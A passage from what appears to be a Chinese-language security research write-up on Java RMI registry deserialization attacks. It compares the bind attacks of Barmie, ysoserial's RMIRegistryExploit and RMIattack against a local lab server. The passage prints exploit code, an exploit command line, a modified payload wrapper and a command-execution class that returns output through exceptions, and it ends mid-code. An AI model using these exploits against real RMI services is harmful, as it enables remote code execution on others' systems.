                //在后面写入我们给定的payload
                out.write(this._payload, 0, this._payload.length);
                //最后给一个NULL标签（作为bind方法的第二个参数）
                out.write((byte)0x70);
                //把新的数据包发送给服务端
                return out;
            } else {
                //不是RMI调用的数据包就直接发送
                return data;
            }
        }
可以看到这边完全是自己重构了客户端发往服务端的数据包，并且给入了两个参数， **payload** 替换 **String** ， **null** 替换
**Remote** 。
我们再攻击一下我们的RMI服务端靶机，用wireshark抓包确认下，顺便把后面Ysoserial-RMIRegistryExploit的包先提上来对比一下：
可以发现Barmie的bind攻击是通过第一个String参数替换payload（Hashset就是CC的攻击链）攻击成功的，而Ysoserial的RMIRegisterExpolit模块的bind攻击是通过构造了一个符合Remote条件的第二个Remote参数（把CC的攻击链包装成了Remote）攻击成功的。
那么之前的疑问 **是不是我们只能攻击必须要是Remote类型的Object接口呢？** 也就破案了：不是，是String和Remote类型均可。
那么也就是说 **lookup** 、 **unbind** 、 **rebind** 、 **bind** 四个接口都可以利用同样的原理攻击。
### Ysoserial-RMIRegistryExploit - Bind
那么Ysoserial不写代理器还去自己把CC攻击链包装成了Remote类型，也挺有意思的，我们看看它是怎么做的。
命令行用这个命令调用exploit模块：`java -cp F:\xxx\java\ysoserial.jar
ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections1
"calc"`
看下核心代码`ysoserial.exploit.RMIRegistryExploit#exploit`：
    public static void exploit(final Registry registry,
                final Class payloadClass,
                final String command) throws Exception {
            new ExecCheckingSecurityManager().callWrapped(new Callable(){public Void call() throws Exception {
                //获取payload
                ObjectPayload payloadObj = payloadClass.newInstance();
                Object payload = payloadObj.getObject(command);
                String name = "pwned" + System.nanoTime();
                //将payload封装成Map
                //然后通过sun.reflect.annotation.AnnotationInvocationHandler建立起动态代理
                //变为Remote类型
                Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
                try {
                    //封装的remote类型，通过RMI客户端的正常接口发出去
                    registry.bind(name, remote);
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                Utils.releasePayload(payloadObj, payload);
                return null;
            }});
        }
    }
使用到了 **动态代理** ，简单总结一下：
  * 被代理的接口：Remote.class
  * 代理的实现类（也可以理解为拦截器）：sun.reflect.annotation.AnnotationInvocationHandler
  * 动态代理之后的对象：调用实现Remote接口的绑定代理的对象的任意方法都会自动被拦截，前往`sun.reflect.annotation.AnnotationInvocationHandler`的invoke方法执行。
简单看下是怎么ysoserial是怎么样完成动态代理的，即`ysoserial.payloads.util.Gadgets#createMemoitizedProxy`的实现：
    public static  T createMemoitizedProxy ( final Map map, final Class iface, final Class... ifaces ) throws Exception {
        //Map是我们传入的，需要填充进入AnnotationInvocationHandler构造方法中的对象。
        //iface是被动态代理的接口
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }
    //这里创建了一个`sun.reflect.annotation.AnnotationInvocationHandler`拦截器的对象
    //传入了我们含有payload的map，进入构造方法，会在构造方法内进行赋值给对象的变量
    public static InvocationHandler createMemoizedInvocationHandler ( final Map map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }
    //正式开始绑定代理动态代理
    //ih 拦截器
    //iface 需要被代理的类
    //ifaces 这里没有
    public static  T createProxy ( final InvocationHandler ih, final Class iface, final Class... ifaces ) {
        final Class[] allIfaces = (Class[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        //上面整合了一下需要代理的接口到allIfaces里面
        //然后Proxy.newProxyInstance，完成allIfaces到ih的绑定
        //（Gadgets.class.getClassLoader()就是获取了一个加载器，不用太管）
        //iface.cast是将获取的绑定结果对象转变为iface（即Remote）的对象类型
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }
这边就完成了一个通过 **动态代理** 封装成了一个Remote.class的接口对象，这样就可以在客户端正常调用`registry.bind(name,
remote);`了，因为bind的接口这么定义了需要Remote对象。
    public void bind(String name, Remote obj)
            throws RemoteException, AlreadyBoundException, AccessException;
那么我们传输过去了我们的remote动态代理对象，在服务端解析过程中与动态代理有关系么？
**答案是：P关系都没有！**
上面可以看到我们的使用的是yso-cc1的payload去在jdk1.7u80中触发payload：而cc1的触发同样使用到了动态代理机制，该payload在服务端的触发与动态代理也息息相关：
  * cc1的payload是一个AnnotationInvocationHandler对象，跟上面类似，在其构造的时候，我们把一个 **动态代理到AnnotationInvocationHandler.invoke方法的map** 塞入了其memberValues属性中
  * 在服务端触发var.readobject()时，会进入AnnotationInvocationHandler类的readobject()
  * 在readobject()中会执行`this.memberValues.entrySet()`。entrySet，这是一个map的方法。根据动态代理性质，我们绑定了map的方法到AnnotationInvocationHandler.invoke方法，所以这边就会进入invoke方法。
  * 同时我们还在这个处心积虑想进来的invoke方法的AnnotationInvocationHandler对象中又弄了一个lazyMap在memberValues属性中！只要触发了这个lazyMap的get方法就等于成功。（之后复杂的就略了）
  * 而AnnotationInvocationHandler.invoke方法中刚好有`this.memberValues.get(var4);`，而这个this.memberValues就是lazyMap。
这边简单讲了下动态代理在一般序列化链中的作用，就是 **连接一个类的任意方法到一个拦截器的invoke方法（到invoke方法！）**
而在这边Ysoserial通过动态代理产生的 **remote对象丝毫没有用到动态代理核心的特点（到invoke方法中）** 。
它实际做的只是把payload放在一个remote接口的类的属性里面。然后在服务端反序列化的时候，利用反序列化一个对象的过程中会递归类的属性进行反序列化的特点，来反序列化我们的payload，从而触发漏洞。
使用动态代理只是因为：动态代理也同样可以做到把payload放在AnnotationInvocationHandler拦截器的属性里面，然后动态代理可以把拦截器包装成任意类接口，如下：
同样我们也可以不用动态代理，自己实现一个remote接口的类，然后放入payload，效果是一样的。
修改一点点：`ysoserial.exploit.RMIRegistryExploit#exploit`
    //加个Remote接口的类，要支持序列化
    private static class BindExploit implements Remote, Serializable {
        //弄个地方放payload
        private final Object memberValues;
        private BindExploit(Object payload) {
            memberValues = payload;
        }
    }
        public static void exploit(final Registry registry,
                final Class payloadClass,
                final String command) throws Exception {
            new ExecCheckingSecurityManager().callWrapped(new Callable(){public Void call() throws Exception {
                ObjectPayload payloadObj = payloadClass.newInstance();
                Object payload = payloadObj.getObject(command);
                String name = "pwned" + System.nanoTime();
                //yso动态代理包装
                //Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
                //自己包装
                Remote remote_lala = new BindExploit(payload);
                try {
                    //registry.bind(name, remote);
                    //自己包装
                     registry.bind(name, remote_lala);
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                Utils.releasePayload(payloadObj, payload);
                return null;
            }});
        }
这里有一个不是很清楚的问题，自实现remote接口往里放入payload，在RMI客户端有这个类，那序列化传输到RMI服务端，
**服务端环境里是没有这个类的，是否会报错，无法利用** ？？
本地测试实际上是两个java项目，攻击方yso项目，服务方RMIserialize项目，因此环境是不通的。
测试报错可以证明，是找不到这个类的，但是却不影响利用。
可以从报错信息中看到是ClassNotFound的，但是仍然弹框成功。大概的理由猜测应该是反序列化恢复一个类的时候会先去处理好他的序列化变量，再去进行组装恢复成类。我们触发payload的过程是恢复他的序列化变量的时候，而之后找得到找不到这个类就不重要了。
>
> 这个ysoserial用动态代理去实现remote接口封装payload的操作真的让我迷惑了好久，我一直以为服务端payload触发和动态代理的特性有关(由于CC链是这样的，想当然这样了)。网上的文章大多一笔带过，这边再次感谢0kami大佬QAQ，沟通是真的解惑。
### RMIattack - Bind + 回显
在反序列化利用的时候，常常遇到你一个payload打过去，但是对方没反应，你也不知道对方执行了命令没有。命令执行结果回显一直是一个很头疼的问题。RMIattack工具解决了命令回显的问题。
这个工具在Ysoserial-RMIRegistryExploit模块的基础上（同样是用动态调用封装payload至remote接口类，并且使用的是CC1的payload）通过写入了一个class文件，再调用class文件来执行系统命令的形式，实现命令回显。我们简单看下实现过程。
其攻击步骤主要分为两部分：
  1. 先判断系统类型：windows，linux，然后写入一个文件再临时目录。（这里修改了CC链的底层调用函数，yso默认是调用Runtime.getRuntime().exec()，这边改成了write()方法）
    * windows的话生成文件`c:/windows/temp/ErrorBaseExec.class`
    * linux的话生成`/tmp/ErrorBaseExec.class`
  2. 根据操作系统类型，从固定路径loadclass加载class，然后调用其do_exec方法，传入要执行的命令。执行的命令结果会写在抛出异常中，服务器通过异常抛出传输执行结果到客户端，然后客户端解析报错信息获取命令执行结果。
由于在工具代码中，写入的文件直接被写成字节串了，这边可以自己打一下自己，来拿到被写入的文件`ErrorBaseExec.class`
    public class ErrorBaseExec {
        public ErrorBaseExec() {
        }
        //解析
        public static String readBytes(InputStream var0) throws IOException {
            BufferedReader var1 = new BufferedReader(new InputStreamReader(var0));
            StringBuffer var2 = new StringBuffer();
            String var3;
            while((var3 = var1.readLine()) != null) {
                var2.append(var3).append("\n");
            }
            String var4 = var2.toString();
            return var4;
        }
        public static void do_exec(String var0) throws Exception {
            try {
                //执行命令
                Process var1 = Runtime.getRuntime().exec(var0);
                //解析执行结果
                String var2 = readBytes(var1.getInputStream());
                //抛出异常到客户端
                throw new Exception("8888:" + var2);
            } catch (Exception var3) {
                if (var3.toString().indexOf("8888") > -1) {
                    throw var3;
                } else {
                    throw new Exception("8888:" + new String(var3.toString()) + "\r\n");
                }